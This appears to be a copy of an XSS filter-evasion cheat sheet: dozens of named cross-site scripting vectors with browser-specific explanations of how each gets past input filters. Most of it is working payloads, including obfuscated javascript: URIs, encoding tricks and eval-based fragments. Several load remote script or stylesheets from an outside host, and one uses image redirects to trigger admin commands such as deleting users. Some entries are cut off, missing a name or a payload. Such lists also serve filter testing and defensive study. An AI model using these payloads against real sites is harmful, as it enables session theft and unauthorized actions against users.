Exploit Description: Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work

Exploit Tags: general, gecko, obfuscated, evil tags

Exploit Name: Commented-out Block
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
Exploit Description: Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.

<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
Exploit Description: Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&#x26;#x09;script:” was converted into ”java&#x09;script:”.
Exploit Tags: general, evil tags, obfuscated

Exploit Name: Cookie Manipulation
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
Exploit Description: Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).

Exploit Tags: general, evil tags, style injection

Exploit Name: DIV background-image 2
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
Exploit Description: Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)

Exploit Name: Double open angle brackets
<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
Exploit Description: This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't

Exploit Name: Embedded Carriage Return
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
Exploit Description: Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).

Exploit Tags: general, evil tags, obfuscated

Exploit Name: Embedded Newline
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
Exploit Description: Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.
Exploit Tags: general, evil tags, obfuscated, internet explorer

Exploit Description: This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.
Exploit Tags: general, title breaking

Exploit Name: Escaping JavaScript escapes
\";alert('XSS');//
Exploit Description: Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=”$ENV{QUERY_STRING}”;</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read <SCRIPT>var a=””;alert('XSS');//”;</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.

Exploit Name: Extraneous Open Brackets
<<SCRIPT>alert("XSS");//<</SCRIPT>
Exploit Description: (Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.

Exploit Name: Firefox Lookups 1
<A HREF="//google">XSS</A>
Exploit Description: Firefox uses Google's ”feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's ”keyword:” protocol. You can concatenate several keywords by using something like the following ”keyword:XSS+RSnake”

Exploit Name: Firefox Lookups 2
<A HREF="http://ha.ckers.org@google">XSS</A>
Exploit Description: This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the ”feeling lucky” function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.

Exploit Name: Grave Accents
<IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
Exploit Description: Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).
Exploit Tags: general, evil tags, obfuscated, internet explorer

Exploit Name: Half-Open HTML/JavaScript
<IMG SRC="javascript:alert('XSS')"
Exploit Description: Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the ”javascript:” directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close > tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:

Exploit Tags: general, evil tags, internet explorer

Exploit Name: IMG Embedded commands 1
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
Exploit Description: This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.
Exploit Tags: general, evil tags

Exploit Name: IMG Embedded commands 2
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
Exploit Description: IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=”http://badguy.com/a.jpg”> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).

Exploit Description: Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for ”&#XX;”, since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).
Exploit Tags: general, evil tags, obfuscated, internet explorer

Exploit Name: Malformed IMG Tags
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
Exploit Description: Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.
Exploit Tags: general, evil tags, obfuscated

Exploit Name: Markup breaker with special quotes

Exploit Tags: general, html breaking, JS breaking

Exploit Name: META
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
Exploit Description: The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.
Exploit Tags: general, evil tags

Exploit Name: META w/additional URL parameter
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">

Exploit Name: No Closing Script Tag
<SCRIPT SRC=http://ha.ckers.org/xss.js
Exploit Description: In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the ”></SCRIPT>” portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.
Exploit Tags: general, evil tags, injection, gecko

Exploit Name: No Quotes/Semicolons
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
Exploit Description: No single quotes or double quotes or semicolons.
Exploit Tags: general, evil tags, obfuscated

Exploit Name: Non-Alpha/Non-Digit
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
Exploit Description: Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example ”<SCRIPT\s” != ”<SCRIPT/XSS\s”
Exploit Tags: general, evil tags, injection

Exploit Name: Non-Alpha/Non-Digit Part 2
<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert("XSS")>
Exploit Description: Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.

Exploit Tags: general, html breaking, obfuscated, user interaction

Exploit Name: Null Chars 1
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
Exploit Description: Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.
Exploit Tags: general, evil tags, obfuscated, internet explorer, CRLF

Exploit Name: Null Chars 2
perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out

Exploit Name: Protocol resolution in script tags
<SCRIPT SRC=//ha.ckers.org/.j>
Exploit Description: This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ”.j” is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.

Exploit Description: Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.
Exploit Tags: general, evil tags, obfuscated, injection

Exploit Name: Remote Stylesheet 2
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
Exploit Description: Remote style sheet part 2 (this works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.
Exploit Tags: general, evil tags, obfuscated, style injection

Exploit Name: Remote Stylesheet 3
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
Exploit Description: Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://ha.ckers.org/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.
Exploit Tags: general, evil tags, injection

Exploit Name: Remote Stylesheet 4
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
Exploit Description: Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.

Exploit Tags: general, evil tags

Exploit Name: Rename .js to .jpg
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
Exploit Description: Assuming you can only fit in a few characters and it filters against ”.js” you can rename your JavaScript file to an image as an XSS vector.

Exploit Name: SCRIPT w/Char Code
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
Exploit Description: Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word ”XSS” will pop up.
Exploit Tags: general, evil tags, obfuscated, basic

Exploit Name: SCRIPT w/Source File
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
Exploit Description: No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).
Exploit Tags: general, evil tags, basic, injection

Exploit Name: Self-contained XSS variant 1
a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))

Exploit Description: This one is pretty hard to detect due to the total fragmentation. Fragments are built together to a self-executing function.
Exploit Tags: general, self contained

Exploit Name: Self-contained XSS variant 5
l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a

Exploit Tags: general, self contained, shuffled

Exploit Name: Self-contained XSS variant 6
_=eval,__=unescape,___=document.URL,_(__(___))
Exploit Description: Since Javascript allows \w+ as variable name - this vector uses _ to evade filters.

Exploit Name: Self-contained XSS variant 7
$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
Exploit Description: Uses special characters as variable names and self-executes the concatenated payload trigger.
Exploit Tags: general, self contained

Exploit Name: Self-contained XSS variant 8

Exploit Description: This time $ is used to obfuscate the self-executing payload trigger.
Exploit Tags: general, self contained

Exploit Name: Self-contained XSS variant 9
evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)
Exploit Description: This more than sophisticated vector is hard to explain - it' creator did here: http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13409
Exploit Tags: general, self contained, shuffled

Exploit Name: Self-containing XSS with no dots
with(location)with(hash)eval(substring(1))
Exploit Description: This vector uses with() to activate the payload behind the fragment identifier. No dots are used to enable easier filter evasion.
Exploit Tags: general, super short, self contained

Exploit Name: Spaces/Meta Chars
<IMG SRC=" &#14;  javascript:alert('XSS');">
Exploit Description: Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word ”javascript:” - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the ”javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal).
Exploit Tags: general, evil tags, obfuscated, internet explorer

Exploit Name: SSI
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
Exploit Description: SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.
Exploit Tags: general, evil tags, obfuscated, SSI, injection

Exploit Name: STYLE
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
Exploit Description: STYLE tag (Older versions of Netscape only)
Exploit Tags: general, evil tags, style injection, gecko

Exploit Name: Style injection via content and double-eval

Exploit Tags: general, onfuscated, style injection

Exploit Name: STYLE w/Anonymous HTML
<XSS STYLE="xss:expression(alert('XSS'))">
Exploit Description: Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)
Exploit Tags: general, evil tags, obfuscated, internet explorer

Exploit Name: STYLE w/background
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

Exploit Name: US-ASCII encoding
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
Exploit Description: Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.
Exploit Tags: general, evil tags, obfuscated

Exploit Name: UTF-7 Encoding
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
Exploit Description: UTF-7 encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google's custom 404 script.
Exploit Tags: general, evil tags, obfuscated

Exploit Name: UTF-8 Unicode Encoding

Exploit Description: HTML+TIME in XML. This is how Grey Magic http://www.greymagic.com/security/advisories/gm005-mc/ hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work.
Exploit Tags: general, evil tags, obfuscated, XML injection

Exploit Name: XML namespace
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
